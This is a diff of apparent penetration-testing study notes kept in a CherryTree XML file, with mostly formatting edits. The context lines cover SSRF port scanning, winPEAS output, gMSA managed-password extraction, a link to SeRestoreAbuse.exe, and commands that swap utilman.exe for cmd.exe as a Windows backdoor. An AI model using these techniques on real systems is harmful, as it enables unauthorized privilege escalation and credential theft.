@@ -199,7 +199,9 @@ More on SQL injections:
 - try requesting localhost =&gt; if we get a specific agent, maybe we will find an exploit for it
 
 For internal port scanning using SSRF, we can use WFUZZ.
-
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
 
 More on that here: </rich_text>
             <rich_text link="webs https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery">https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery</rich_text>
@@ -750,6 +752,7 @@ x86_64-w64-mingw32-gcc - Win x64</codebox>
         <node name="Important" unique_id="119" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693136040" ts_lastsave="1693136108">
           <rich_text>When we cannot read the winpeas output on kali machine, we have to use:
 </rich_text>
+          <rich_text justification="left"></rich_text>
           <codebox char_offset="72" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">dos2unix -f outputwinpeas.txt # will convert to readable file on *NIX systems
 # Then
 less -r outputwinpeas.txt</codebox>
@@ -971,7 +974,7 @@ echo "password" | .\scp.exe -P 6000 file kali@{pivot IP}:file # the actual trans
         <rich_text>)
 - Check for password reusal</rich_text>
       </node>
-      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693142435">
+      <node name="Interesting Cases" unique_id="120" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1693140125" ts_lastsave="1693142444">
         <rich_text>If we find that we have </rich_text>
         <rich_text weight="heavy">PrincipalsAllowedToRetrieveManagedPassword</rich_text>
         <rich_text> (we have an allowed group) permissions to extract passwords, use: </rich_text>
@@ -998,6 +1001,7 @@ If we have </rich_text>
 
 Or try this: </rich_text>
         <rich_text link="webs https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe">https://github.com/dxnboy/redteam/blob/master/SeRestoreAbuse.exe</rich_text>
+        <rich_text>.</rich_text>
         <codebox char_offset="366" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
 move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe</codebox>
       </node>
